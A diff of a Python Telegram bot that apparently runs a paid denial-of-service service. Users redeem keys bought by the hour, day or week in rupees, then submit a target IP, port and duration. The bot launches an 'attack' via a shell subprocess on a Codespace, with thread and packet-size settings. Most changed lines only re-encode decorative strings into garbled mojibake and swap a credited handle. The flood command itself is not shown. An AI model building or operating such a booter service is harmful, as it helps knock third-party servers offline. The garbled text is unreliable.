@@ -340,12 +340,12 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
 
         # Send initial attack message
         bot.send_message(chat_id, 
-            f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n"
-            f"𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n"
-            f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝐒𝐞𝐜.\n"
-            f"𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {thread_count}\n"
-            f"𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝗶𝘇𝗲: {packet_size}\n"
-            f"ᚄ1�7 ᚄ1�7 @Nawab79 ᚄ1�7 ᚄ1�7")
+            f"ð ðððð®ð°ð¸ ð¦ðð®ð¿ðð²ð±ð¥\n\n"
+            f"ð§ð®ð¿ð´ð²ð: {target_ip}:{target_port}\n"
+            f"ðððð®ð°ð¸ ð§ð¶ðºð²: {duration} ððð.\n"
+            f"ð§ðµð¿ð²ð®ð±ð: {thread_count}\n"
+            f"ð£ð®ð°ð¸ð²ð ð¦ð¶ðð²: {packet_size}\n"
+            f"á1¤7 á1¤7 @team_sad001 á1¤7 á1¤7")
 
         # Create and run process without output
         process = await asyncio.create_subprocess_shell(
@@ -359,7 +359,7 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
 
         # Send completion message
         bot.send_message(chat_id, 
-            f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀")
+            f"ðððð®ð°ð¸ ðð¶ð»ð¶ððµð²ð± ð¦ðð°ð°ð²ððð³ðð¹ð¹ð ð")
 
     except Exception as e:
         bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")
@@ -376,7 +376,7 @@ def attack_command(message):
         seconds = remaining % 60
         bot.send_message(
             chat_id,
-            f"*⏄1�7 Cooldown in progress! Please wait {minutes}m {de}s before starting another attack.*",
+            f"*â1¤7 Cooldown in progress! Please wait {minutes}m {de}s before starting another attack.*",
             parse_mode='Markdown'
         )
         return
@@ -384,7 +384,7 @@ def attack_command(message):
     # If user is admin, allow attack
     if is_admin(user_id):
         try:
-            bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✄1�7:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*ðð¥ððð¬ð ðð«ð¨ð¯ð¢ðð â1¤7:\n<ðð> <ðððð> <ðððð>.*", parse_mode='Markdown')
             bot.register_next_step_handler(message, process_attack_command, chat_id)
             return
         except Exception as e:
@@ -396,11 +396,11 @@ def attack_command(message):
     found_user = next((user for user in users if user['user_id'] == user_id), None)
 
     if not found_user:
-        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- ᚄ1�7 @team_sad001 ᚄ1�7*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- á1¤7 @team_sad001 á1¤7*", parse_mode='Markdown')
         return
 
     try:
-        bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✄1�7:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*ðð¥ððð¬ð ðð«ð¨ð¯ð¢ðð â1¤7:\n<ðð> <ðððð> <ðððð>.*", parse_mode='Markdown')
         bot.register_next_step_handler(message, process_attack_command, chat_id)
     except Exception as e:
         logging.error(f"Error in attack command: {e}")
@@ -416,7 +416,7 @@ def process_attack_command(message, chat_id):
             seconds = remaining % 60
             bot.send_message(
                 chat_id,
-                f"*⏄1�7 Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
+                f"*â1¤7 Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
                 parse_mode='Markdown'
             )
             return
@@ -424,7 +424,7 @@ def process_attack_command(message, chat_id):
         args = message.text.split()
         
         if len(args) != 3:
-            bot.send_message(chat_id, "*गलऄ1�7 हुऄ1�7 हैॄ1�7 ट्राऄ1�7 अगेन 😼*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*à¤à¤²à¤1¤7 à¤¹à¥à¤1¤7 à¤¹à¥à¥1¤7 à¤à¥à¤°à¤¾à¤1¤7 à¤à¤à¥à¤¨ ð¼*", parse_mode='Markdown')
             return
         
         target_ip = args[0]
@@ -462,7 +462,7 @@ def process_attack_command(message, chat_id):
 
 @bot.message_handler(commands=['owner'])
 def send_owner_info(message):
-    owner_message = "This Bot Has Been Developed By ᚄ1�7 @Nawab79 ᚄ1�7"  
+    owner_message = "This Bot Has Been Developed By á1¤7 @Nawab79 á1¤7"  
     bot.send_message(message.chat.id, owner_message)
 
 @bot.message_handler(commands=['addadmin'])
@@ -510,7 +510,7 @@ def add_admin_command(message):
             try:
                 bot.send_message(
                     int(new_admin_id),
-                    "*🎉 Congratulations! You have been promoted to admin!*\n"
+                    "*ð Congratulations! You have been promoted to admin!*\n"
                     f"Your starting balance is: `{balance}`\n\n"
                     "You now have access to admin commands:\n"
                     "/genkey - Generate new key\n"
@@ -591,13 +591,13 @@ def send_welcome(message):
 
     # Create keyboard markup
     markup = ReplyKeyboardMarkup(resize_keyboard=True)
-    my_account_button = KeyboardButton("𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦")
-    attack_button = KeyboardButton("🚀 𝐀𝐭𝐭𝐚𝐜𝐤")
+    my_account_button = KeyboardButton("ðð² ðððð¨ð®ð§ð­ð¦")
+    attack_button = KeyboardButton("ð ðð­ð­ððð¤")
     markup.add(my_account_button, attack_button)
 
     if is_super_admin(user_id):
         welcome_message = (
-            f"Welcome, Super Admin! Developed By ᚄ1�7 @Nawab79 ᚜\n\n"
+            f"Welcome, Super Admin! Developed By á1¤7 @Nawab79 á\n\n"
             f"Admin Commands:\n"
             f"/addadmin - Add new admin\n"
             f"/removeadmin - Remove admin\n"
@@ -610,7 +610,7 @@ def send_welcome(message):
     elif is_admin(user_id):
         balance = get_admin_balance(user_id)
         welcome_message = (
-            f"Welcome, Admin! Developed By ᚄ1�7 @Nawab79 ᚜\n\n"
+            f"Welcome, Admin! Developed By á1¤7 @Nawab79 á\n\n"
             f"Your Balance: {balance}\n\n"
             f"Admin Commands:\n"
             f"/genkey - Generate new key\n"
@@ -619,12 +619,12 @@ def send_welcome(message):
         )
     else:
         welcome_message = (
-            f"Welcome, {username}! Developed By ᚄ1�7 @Nawab79 ᚜\n\n"
+            f"Welcome, {username}! Developed By á1¤7 @Nawab79 á\n\n"
             f"Please redeem a key to access bot functionalities.\n"
             f"Available Commands:\n"
             f"/redeem - To redeem key\n"
             f"/Attack - Start an attack\n\n"
-            f"Contact ᚄ1�7 @Nawab79 ᚄ1�7 for new keys"
+            f"Contact á1¤7 @Nawab79 á1¤7 for new keys"
         )
 
     bot.send_message(message.chat.id, welcome_message, reply_markup=markup)
@@ -635,7 +635,7 @@ def genkey_command(message):
     chat_id = message.chat.id
 
     if not is_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: ᚄ1�7 @Nawab79 ᚄ1�7*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: á1¤7 @Nawab79 á1¤7*", parse_mode='Markdown')
         return
 
     cmd_parts = message.text.split()
@@ -643,9 +643,9 @@ def genkey_command(message):
         bot.send_message(chat_id, (
             "*Usage: /genkey <amount> <unit>*\n\n"
             "Available units and prices:\n"
-            "- hour/hours (10₄1�7 per hour)\n"
-            "- day/days (80₄1�7 per day)\n"
-            "- week/weeks (500₄1�7 per week)"
+            "- hour/hours (10â1¤7 per hour)\n"
+            "- day/days (80â1¤7 per day)\n"
+            "- week/weeks (500â1¤7 per week)"
         ), parse_mode='Markdown')
         return
     
@@ -676,8 +676,8 @@ def genkey_command(message):
             current_balance = get_admin_balance(user_id)
             bot.send_message(chat_id, 
                 f"*Insufficient balance!*\n\n"
-                f"Required: {price}₹\n"
-                f"Your balance: {current_balance}₄1�7", 
+                f"Required: {price}â¹\n"
+                f"Your balance: {current_balance}â1¤7", 
                 parse_mode='Markdown')
             return
         
@@ -694,15 +694,15 @@ def genkey_command(message):
             f"*Key generated successfully!*\n\n"
             f"Key: `{key}`\n"
             f"Duration: {amount} {time_unit}\n"
-            f"Price: {price}₹\n"
-            f"Remaining balance: {new_balance}₹\n\n"
+            f"Price: {price}â¹\n"
+            f"Remaining balance: {new_balance}â¹\n\n"
             f"Copy this key and use:\n/redeem {key}"
         )
         
         bot.send_message(chat_id, success_msg, parse_mode='Markdown')
         
         # Log the transaction
-        logging.info(f"Admin {user_id} generated key worth {price}₄1�7 for {amount} {time_unit}")
+        logging.info(f"Admin {user_id} generated key worth {price}â1¤7 for {amount} {time_unit}")
     
     except ValueError:
         bot.send_message(chat_id, "*Invalid amount. Please enter a number.*", parse_mode='Markdown')
@@ -768,7 +768,7 @@ def remove_user_command(message):
     chat_id = message.chat.id
 
     if not is_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- ᚄ1�7 @Nawab79 ᚄ1�7*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- á1¤7 @Nawab79 á1¤7*", parse_mode='Markdown')
         return
 
     cmd_parts = message.text.split()
@@ -802,7 +802,7 @@ def list_users_command(message):
     else:
         bot.send_message(chat_id, "No users have valid keys.")
 
-@bot.message_handler(func=lambda message: message.text == "🚀 𝐀𝐭𝐭𝐚𝐜𝐤")
+@bot.message_handler(func=lambda message: message.text == "ð ðð­ð­ððð¤")
 def attack_button_handler(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
@@ -814,7 +814,7 @@ def attack_button_handler(message):
         seconds = remaining % 60
         bot.send_message(
             chat_id,
-            f"*⏄1�7 Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
+            f"*â1¤7 Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
             parse_mode='Markdown'
         )
         return
@@ -822,7 +822,7 @@ def attack_button_handler(message):
     # Rest of the handler remains the same...
     if is_admin(user_id):
         try:
-            bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✄1�7:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*ðð¥ððð¬ð ðð«ð¨ð¯ð¢ðð â1¤7:\n<ðð> <ðððð> <ðððð>.*", parse_mode='Markdown')
             bot.register_next_step_handler(message, process_attack_command, chat_id)
             return
         except Exception as e:
@@ -833,21 +833,21 @@ def attack_button_handler(message):
     found_user = next((user for user in users if user['user_id'] == user_id), None)
 
     if not found_user:
-        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚄ1�7 @Nawab79 ᚄ1�7*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*ðð¨ð® ðð«ð ð§ð¨ð­ ð«ðð ð¢ð¬ð­ðð«ðð. ðð¥ððð¬ð ð«ððððð¦ ð ð¤ðð² ðð¨ ðð°ð§ðð«:- á1¤7 @Nawab79 á1¤7*", parse_mode='Markdown')
         return
 
     valid_until = datetime.fromisoformat(found_user['valid_until'])
     if datetime.now() > valid_until:
-        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚄ1�7 @Nawab79 ᚄ1�7.*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*ðð¨ð®ð« ð¤ðð² ð¡ðð¬ ðð±ð©ð¢ð«ðð. ðð¥ððð¬ð ð«ððððð¦ ð ð¤ðð² ðð¨ ðð°ð§ðð«:- á1¤7 @Nawab79 á1¤7.*", parse_mode='Markdown')
         return
 
     try:
-        bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✄1�7:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*ðð¥ððð¬ð ðð«ð¨ð¯ð¢ðð â1¤7:\n<ðð> <ðððð> <ðððð>.*", parse_mode='Markdown')
         bot.register_next_step_handler(message, process_attack_command, chat_id)
     except Exception as e:
         logging.error(f"Error in attack button: {e}")
 
-@bot.message_handler(func=lambda message: message.text == "𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦")
+@bot.message_handler(func=lambda message: message.text == "ðð² ðððð¨ð®ð§ð­ð¦")
 def my_account(message):
     user_id = message.from_user.id
     users = load_users()
@@ -857,28 +857,28 @@ def my_account(message):
 
     if is_super_admin(user_id):
             account_info = (
-                "👑---------------𝐀𝐝𝐦𝐢𝐧 𝐃𝐚𝐬𝐡𝐛𝐨𝐚𝐫𝐝---------------👑       \n\n"
-                "🌟  𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀               \n"
-                "ꜱᴛᴄ1�7ᴛᴜ꜄1�7: Super Admin\n"
-                "ᴄ1�7ᴄᴄᴇꜱ꜄1�7 ʟᴇᴠᴇʄ1�7: Unlimited\n"
-                "ᴘʄ1�7ɪᴠɪʟᴇɢᴇꜱ: Full System Control\n\n"
-                "💼  𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻𝘀 \n"
-                " 1�7 Generate Keys\n"
-                " 1�7 Manage Admins\n"
-                " 1�7 System Configuration\n"
-                " 1�7 Unlimited Balance"
+                "ð---------------ððð¦ð¢ð§ ððð¬ð¡ðð¨ðð«ð---------------ð       \n\n"
+                "ð  ðð°ð°ð¼ðð»ð ðð²ðð®ð¶ð¹ð               \n"
+                "ê±á´á´1¤7á´á´ê1¤7: Super Admin\n"
+                "á´1¤7á´á´á´ê±ê1¤7 Êá´á´ á´Ê1¤7: Unlimited\n"
+                "á´Ê1¤7Éªá´ ÉªÊá´É¢á´ê±: Full System Control\n\n"
+                "ð¼  ð£ð²ð¿ðºð¶ððð¶ð¼ð»ð \n"
+                "â1¤7 Generate Keys\n"
+                "â1¤7 Manage Admins\n"
+                "â1¤7 System Configuration\n"
+                "â1¤7 Unlimited Balance"
             )
     
     elif is_admin(user_id):
             # For regular admins
             balance = get_admin_balance(user_id)
             account_info = (
-                "🛡︄1�7---------------𝐀𝐝𝐦𝐢𝐧 𝐏𝐫𝐨𝐟𝐢𝐥𝐞---------------🛡️n\n"
-                f"💰  𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance}₹\n\n"
-                "🌐  𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗦𝘁𝗮𝘁𝘂𝘀:\n"
-                " 1�7 ʀᴏʟᴇ: Admin\n"
-                " 1�7 ᴄ1�7ᴄᴄᴇꜱ꜄1�7: Restricted\n"
-                " 1�7 ᴘʄ1�7ɪᴠɪʟᴇɢᴇꜱ:\n"
+                "ð¡ï¸1¤7---------------ððð¦ð¢ð§ ðð«ð¨ðð¢ð¥ð---------------ð¡ï¸n\n"
+                f"ð°  ðð®ð¹ð®ð»ð°ð²: {balance}â¹\n\n"
+                "ð  ðð°ð°ð¼ðð»ð ð¦ðð®ððð:\n"
+                "â1¤7 Êá´Êá´: Admin\n"
+                "â1¤7 á´1¤7á´á´á´ê±ê1¤7: Restricted\n"
+                "â1¤7 á´Ê1¤7Éªá´ ÉªÊá´É¢á´ê±:\n"
                 "  - Generate Keys\n"
                 "  - User Management\n"
                 "  - Balance Tracking"
@@ -889,19 +889,19 @@ def my_account(message):
 
         if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
             account_info = (
-                "𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐚 𝐧𝐞𝐰 𝐤𝐞𝐲.\n"
-                "Contact ᚄ1�7 @Nawab79 ᚄ1�7 for assistance."
+                "ðð¨ð®ð« ð¤ðð² ð¡ðð¬ ðð±ð©ð¢ð«ðð. ðð¥ððð¬ð ð«ððððð¦ ð ð§ðð° ð¤ðð².\n"
+                "Contact á1¤7 @Nawab79 á1¤7 for assistance."
             )
         else:
             account_info = (
-                f"𝕐𝕠𝕦𝕣 𝔸𝕔𝕔𝕠𝕦𝕟𝕥 𝕀𝕟𝕗𝕠𝕣𝕞𝕒𝕥𝕚𝕠𝕟:\n\n"
-                f"ᴜꜱᴇʄ1�7ɴᴄ1�7ᴍᴇ: {found_user.get('username', 'N/A')}\n"
-                f"ᴠᴀʟɪᴄ1�7 ᴜɴᴛɪʟ: {valid_until}\n"
-                f"ᴘʟᴀɴ: {found_user.get('plan', 'N/A')}\n"
-                f"ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴄ1�7: {current_time}"
+                f"ðð ð¦ð£ ð¸ððð ð¦ðð¥ ðððð ð£ððð¥ðð ð:\n\n"
+                f"á´ê±á´Ê1¤7É´á´1¤7á´á´: {found_user.get('username', 'N/A')}\n"
+                f"á´ á´ÊÉªá´1¤7 á´É´á´ÉªÊ: {valid_until}\n"
+                f"á´Êá´É´: {found_user.get('plan', 'N/A')}\n"
+                f"á´á´ÊÊá´É´á´ á´Éªá´á´1¤7: {current_time}"
             )
     else:
-        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛@Nawab79 ᚄ1�7."
+        account_info = "ðð¥ððð¬ð ð«ððððð¦ ð ð¤ðð² ðð¨ ðð°ð§ðð«:- á@Nawab79 á1¤7."
 
     bot.send_message(message.chat.id, account_info)
 
